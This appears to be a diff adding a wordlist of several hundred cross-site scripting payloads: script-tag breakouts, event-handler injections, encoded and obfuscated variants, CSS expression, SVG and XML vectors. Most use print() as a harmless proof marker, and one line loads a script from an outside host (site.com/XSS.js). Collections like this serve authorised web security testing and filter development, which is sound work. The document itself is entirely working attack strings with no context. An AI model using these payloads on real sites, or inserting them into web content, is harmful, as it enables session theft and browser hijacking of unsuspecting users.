+<body onLoad="while(true) print();">
+'"></title><script>print()</script>
+</textarea>'"><script>print()</script>
+'""><script language="JavaScript"> print();</script>
+</script></script><<<<script><>>>><<<script>print()</script>
+'></select><script>print()</script>
+a="get";b="URL";c="javascript:";d="print();";eval(a+b+c+d);
+='><script>print()</script>
+<body background=javascript:'"><script>print()</script>></body>
+">/XaDoS/><script>print()</script><script src="http://www.site.com/XSS.js"></script>
+">/KinG-InFeT.NeT/><script>print()</script>
+!--" /><script>print();</script>
+<script>print()</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>print()</script>><marquee><h1>XSS by xss</h1></marquee>
+'"></title><script>print()</script>><marquee><h1>XSS by xss</h1></marquee>
+<img """><script>print()</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>print()</script>"><script>alert("XSS by \nxss</h1></marquee>
+<iframe src="javascript:print();"></iframe><marquee><h1>XSS by xss</h1></marquee>
+'); print(); var x='
+\\'); print();var x=\'
+>"><ScRiPt%20%0a%0d>print()%3B</ScRiPt>
+<SCRIPT> print(); </SCRIPT>
+<TD BACKGROUND="javascript:print()">
+&lt;BASE HREF=&quot;javascript:print();//&quot;&gt;
+&lt;BGSOUND SRC=&quot;javascript:print();&quot;&gt;
+&lt;BODY BACKGROUND=&quot;javascript:print();&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(javascript:print())&quot;&gt;
+&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:print())&quot;&gt;
+&lt;DIV STYLE=&quot;width: expression(print());&quot;&gt;
+&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:print();&quot;&gt;&lt;/FRAMESET&gt;
+&lt;IFRAME SRC=&quot;javascript:print();&quot;&gt;&lt;/IFRAME&gt;
+&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:print();&quot;&gt;
+&lt;IMG SRC=&quot;javascript:print();&quot;&gt;
+&lt;IMG SRC=javascript:print()&gt;
+&lt;IMG DYNSRC=&quot;javascript:print();&quot;&gt;
+&lt;IMG LOWSRC=&quot;javascript:print();&quot;&gt;
+&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:print()&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:print();&quot;&gt;
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:print();&quot;&gt;
+&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:print()&gt;&lt;/OBJECT&gt;
+a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;print();&quot;)&quot;;&#10;eval(a+b+c+d);
+&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;print();&lt;/STYLE&gt;
+&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(print())&quot;&gt;
+&lt;XSS STYLE=&quot;xss:expression(print())&quot;&gt;
+&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:print()&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
+&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:print()&quot;)}&lt;/STYLE&gt;
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:print();&quot;&gt;
+&lt;TABLE BACKGROUND=&quot;javascript:print()&quot;&gt;&lt;/TABLE&gt;
+&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:print()&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:print();&quot;&gt;]]&gt;
+&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:print()&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;print()&lt;/SCRIPT&gt;&quot;&gt;
+&lt;BR SIZE=&quot;&amp;{print()}&quot;&gt;
+&lt;IMG SRC=JaVaScRiPt:print()&gt;
+&lt;IMG SRC=`javascript:print()`&gt;
+&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-print();+ADw-/SCRIPT+AD4-
+\&quot;;print();//
+&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:print()&apos;;&lt;/STYLE&gt;
+&lt;IMG SRC=&quot;jav&#x09;ascript:print();&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x09;ascript:print();&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:print();&quot;&gt;
+&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:print();&quot;&gt;
+perl -e &apos;print &quot;&lt;IMG SRC=java\0script:print()>&quot;;&apos;&gt; out
+perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;print()&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
+&lt;IMG SRC=&quot; &amp;#14;  javascript:print();&quot;&gt;
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=print()&gt;
+&lt;IMG SRC=&quot;javascript:print()&quot;
+&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;print()&lt;/SCRIPT&gt;&quot;&gt;
+&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=print()&gt;
+&lt;/script&gt;&lt;script&gt;print()&lt;/script&gt;
+&lt;/br style=a:expression(print())&gt;
+&lt;scrscriptipt&gt;print()&lt;/scrscriptipt&gt;
+&lt;br size=\&quot;&amp;{print()}\&quot;&gt;
+perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:print()&gt;\&quot;;&#039; &gt; out
+perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;print()&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
+<~/XSS/*-*/STYLE=xss:e/**/xpression(print())>
+<~/XSS STYLE=xss:expression(print())>
+</XSS/*-*/STYLE=xss:e/**/xpression(print())>
+XSS/*-*/STYLE=xss:e/**/xpression(print())>
+XSS STYLE=xss:e/**/xpression(print())>
+</XSS STYLE=xss:expression(print())>
+<;SCRIPT>;print()<;/SCRIPT>;
+<;BASE HREF=";javascript:print();//";>;
+<;BGSOUND SRC=";javascript:print();";>;
+<;BODY BACKGROUND=";javascript:print();";>;
+<;BODY ONLOAD=print()>;
+<;DIV STYLE=";background-image: url(javascript:print())";>;
+<;DIV STYLE=";background-image: url(&;#1;javascript:print())";>;
+<;DIV STYLE=";width: expression(print());";>;
+<;FRAMESET>;<;FRAME SRC=";javascript:print();";>;<;/FRAMESET>;
+<;IFRAME SRC=";javascript:print();";>;<;/IFRAME>;
+<;INPUT TYPE=";IMAGE"; SRC=";javascript:print();";>;
+<;IMG SRC=";javascript:print();";>;
+<;IMG SRC=javascript:print()>;
+<;IMG DYNSRC=";javascript:print();";>;
+<;IMG LOWSRC=";javascript:print();";>;
+<;STYLE>;li {list-style-image: url(";javascript:print()";);}<;/STYLE>;<;UL>;<;LI>;XSS
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:print();";>;
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:print();";>;
+<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:print()>;<;/OBJECT>;
+a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";print();";)";;&#10;eval(a+b+c+d);
+<;STYLE TYPE=";text/javascript";>;print();<;/STYLE>;
+<;IMG STYLE=";xss:expr/*XSS*/ession(print())";>;
+<;XSS STYLE=";xss:expression(print())";>;
+<;STYLE>;.XSS{background-image:url(";javascript:print()";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
+<;STYLE type=";text/css";>;BODY{background:url(";javascript:print()";)}<;/STYLE>;
+<;LINK REL=";stylesheet"; HREF=";javascript:print();";>;
+<;TABLE BACKGROUND=";javascript:print()";>;<;/TABLE>;
+<;TABLE>;<;TD BACKGROUND=";javascript:print()";>;<;/TD>;<;/TABLE>;
+<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:print();";>;]]>;
+<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:print()";>;<;/B>;<;/I>;<;/XML>;
+<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;print()<;/SCRIPT>;";>;
+<;BR SIZE=";&;{print()}";>;
+<;IMG SRC=JaVaScRiPt:print()>;
+<;IMG SRC=`javascript:print()`>;
+<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-print();+ADw-/SCRIPT+AD4-
+\";;print();//
+<;/TITLE>;<;SCRIPT>;print();<;/SCRIPT>;
+<;STYLE>;@im\port';\ja\vasc\ript:print()';;<;/STYLE>;
+<;IMG SRC=";jav&#x09;ascript:print();";>;
+<;IMG SRC=";jav&;#x09;ascript:print();";>;
+<;IMG SRC=";jav&;#x0A;ascript:print();";>;
+<;IMG SRC=";jav&;#x0D;ascript:print();";>;
+perl -e ';print ";<;IM SRC=java\0script:print()>";;';>; out
+perl -e ';print ";&;<;SCR\0IPT>;print()<;/SCR\0IPT>;";;'; >; out
+<;IMG SRC="; &;#14;  javascript:print();";>;
+<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=print()>;
+<;IMG SRC=";javascript:print()";
+<;<;SCRIPT>;print();//<;<;/SCRIPT>;
+<;IMG ";";";>;<;SCRIPT>;print()<;/SCRIPT>;";>;
+";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=print()>;
+<;/script>;<;script>;print()<;/script>;
+<;/br style=a:expression(print())>;
+<;scrscriptipt>;print()<;/scrscriptipt>;
+<;br size=\";&;{print()}\";>;
+perl -e &#039;print \";<;IMG SRC=java\0script:print()>;\";;&#039; >; out
+perl -e &#039;print \";<;SCR\0IPT>;print()<;/SCR\0IPT>;\";;&#039; >; out
+>"><script>print()</script>&
+"><STYLE>@import"javascript:print()";</STYLE>
+>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;print()>
+>%22%27><img%20src%3d%22javascript:print()%22>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>print();<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+"><s"%2b"cript>print()</script>
+<marquee onstart='javascript:print();'>=(◕_◕)="-print()-"
+"onclick=print()>"@x.y
+"onclick=print()><svg/onload=print()>"@x.y
+<image/src/onerror=print()>
+<img/src/onerror=print()>
+<image src/onerror=print()>
+<img src/onerror=print()>
+<image src =q onerror=print()>
+<img src =q onerror=print()>
+</scrip</script>t><img src =q onerror=print()>
+<marquee onstart='javascript:print();'>=(◕_◕)=<SCRIPT>print();</SCRIPT>
+<META HTTP-EQUIV="Link" Content="<javascript:print()>; REL=stylesheet">
+getURL("javascript:print()")
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:print();">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;print()&lt;/SCRIPT&gt;">
+<deTAiLs/open/oNtoGGle=print()>
+<scRiPt y="><">/*<sCRipt* */print()</script
+<A href="javascript%26colon;print()">click
+<A href=javas%26#99;ript:print()>click
+<svG/x=">"/oNloaD=print()//
+<Z oncut=print()>x
+<iFrAMe/src \/\/onload = print()
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x><form id="test"></form><button form="test" formaction="javascript:print()">X</button>
+<input onfocus=print() autofocus>
+<input onblur=print() autofocus><input autofocus>
+<a style="-o-link:'javascript:print()';-o-link-source:current">X</a>
+<video poster=javascript:print()//></video>
+<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:print()"></g></svg>
+X<x style=`behavior:url(#default#time2)` onbegin=`print()` >
+<?xml-stylesheet href="javascript:print()"?><root/>
+<form id=test onforminput=print()><input></form><button form=test onformchange=print()>X</button>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=print()&gt;`>
++ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),print();
+<style>p[foo=bar{}*{-o-link:'javascript:print()'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=print()&gt;>
+<link rel=stylesheet href=data:,*%7bx:expression(print())%7d
+<style>@import "data:,*%7bx:expression(print())%7D";</style>
+<table background="javascript:print()"></table>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="print();">XXX</a></a><a href="javascript:print()">XXX</a>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:print() strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:print()">XXX</a>
+<comment><img src="</comment><img src=x onerror=print()//">
+<![><img src="]><img src=x onerror=print()//"><svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror=print()//"></svg>
+<li style=list-style:url() onerror=print()></li><div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=print()></div>
+<head><base href="javascript://"/></head><body><a href="/. /,print()//#">XXX</a></body>
+<svg xmlns="http://www.w3.org/2000/svg"><script>print()</script></svg>
+<SCRIPT FOR=document EVENT=onreadystatechange>print()</SCRIPT>
+<script>[{'a':Object.prototype.__defineSetter__('b',function(){print()}),'b':['secret']}]</script>
+<video><source onerror="print()">
+<video onerror="print()"><source></source></video>
+<b <script>print()//</script>0</script></b>
+<b><script<b></b><print()</script </b></b>
+<div id="div1"><input value="``onmouseover=print()"></div><div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<x '="foo"><x foo='><img src=x onerror=print()//'><!-- IE 6-9 --><! '="foo"><x foo='><img src=x onerror=print()//'><? '="foo"><x foo='><img src=x onerror=print()//'>
+<embed src="javascript:print()"></embed> // O10.10↓, OM10.0↓, GC6↓, FF<img src="javascript:print()"><image src="javascript:print()"> // IE6, O10.10↓, OM10.0↓<script src="javascript:print()"></script> // IE6, O11.01↓, OM10.1↓
+<svg onload="javascript:print()" xmlns="http://www.w3.org/2000/svg"></svg>
+<!DOCTYPE x [<!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx:x" onerror CDATA "print()" onload CDATA "print()">]><img />
+<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml"><html:style /><x xlink:href="javascript:print()" xlink:type="simple">XXX</x></doc>
+<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:print()"/></onevent><timer value="1"/></card>
+<div style=width:1px;filter:glow onfilterchange=print()>x</div>
+<form><button formaction="javascript:print()">X</button>
+<event-source src="event.php" onload="print()">
+<a href="javascript:print()"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>
+<script<{print()}/></script </>
+<?xml-stylesheet type="text/css"?><root style="x:expression(print())"/>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(print())}</style>
+<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:print()" xlink:type="simple"/>
+<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:print()"><x:timer value="1"/></x:template>
+<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:print()//#x"/>
+<body oninput=print()><input autofocus>
+<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:print()"><rect width="1000" height="1000" fill="white"/></a></svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><animation xlink:href="javascript:print()"/><animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='print()'%3E%3C/svg%3E"/><image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='print()'%3E%3C/svg%3E"/><foreignObject xlink:href="javascript:print()"/><foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(88)%3C/script%3E"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="print()"/><animate attributeName="onunload" to="print()"/></svg>
+<? foo="><script>print()</script>"><! foo="><script>print()</script>"></ foo="><script>print()</script>"><? foo="><x foo='?><script>print()</script>'>"><! foo="[[[x]]"><x foo="]foo><script>print()</script>"><% foo><x foo="%><script>print()</script>">
+<div style="list-style:url(http://foo.f)\20url(javascript:print());">X</div>
+<svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">print()</handler></svg>
+<div id=d><x xmlns="><iframe onload=print()"></div><script>d.innerHTML+='';</script><div id=d><x xmlns='"><iframe onload=print()//'></div><script>d.innerHTML+='';</script>
+<img[a][b]src=x[d]onerror[c]=[e]"print()">
+<a href="[a]java[b]script[c]:print()">XXX</a>
+<img src="x` `<script>print()</script>"` `>
+<svg xmlns="http://www.w3.org/2000/svg" id="foo"><x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E print() %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/></svg>
+<img src onerror /" '"= alt=print()//">
+<title onpropertychange=print()></title><title title=></title>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx:x onerror=print()></a>"><!a foo=x=`y><img alt="`><img src=xx:x onerror=print()//"><?a foo=x=`y><img alt="`><img src=xx:x onerror=print()//">
+<!--[if]><script>print()</script --><!--[if<img src=x onerror=print()//]> -->
+<div id="x">x</div><xml:namespace prefix="t"><import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=print()&gt;">
+<span class=foo>Some text</span><a class=bar href="http://www.example.org">www.example.org</a><script src="http://code.jquery.com/jquery-1.4.4.js"></script><script>$("span.foo").click(function(){print();$("a.bar").click();});$("a.bar").click(function(){print();location="http://html5sec.org";});</script></div><script src="/\example.com\foo.js"></script><script src="\\example.com\foo.js"></script></div><?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg"><xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:print()"></iframe></xsl:template></xsl:stylesheet><circle fill="red" r="40"></circle></svg>
+<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object><object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="print()" style="behavior:url(#x);"><param name=postdomevents /></object>
+<svg xmlns="http://www.w3.org/2000/svg" id="x"><listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/><handler id="y">print()</handler></svg>
+<svg><style>&lt;img/src=x onerror=print()// </b>
+<svg><image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.print()</script></svg>")'></svg>
+<math href="javascript:print()">CLICKME</math><math><maction actiontype="statusline#http://google.com" xlink:href="javascript:print()">CLICKME</maction><maction actiontype="statusline" xlink:href="javascript:print()">CLICKME<mtext>http://http://google.com</mtext></maction></math>
+<b>drag and drop one of the following strings to the drop box:</b><br/><hr/>jAvascript:print();//<br/><hr/>feed:javascript:print();<br/><hr/>feed:data:text/html,&#x3c;script>print()&#x3c;/script>&#x3c;b><br/><hr/>feed:feed:javAscript:javAscript:feed:print();<br/><hr/><div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>
+<!-- `<img/src=xx:xx onerror=print()//--!>
+<xmp><%</xmp><img alt='%></xmp><img src=xx:x onerror=print()//'><script>x='<%'</script> %>/print()</script>XXX<style>*['<!--']{}</style>-->{}*{color:red}</style>
+<?xml-stylesheet type="text/xsl" href="#" ?><stylesheet xmlns="http://www.w3.org/TR/WD-xsl"><template match="/"><eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.print()</eval><if expr="new ActiveXObject('htmlfile').parentWindow.print()"></if></template></stylesheet>
+<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?"><circle r="400"></circle><animate attributeName="xlink:href" begin="0" from="javascript:print()" to="&" /></a>
+<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-print()//']</script>
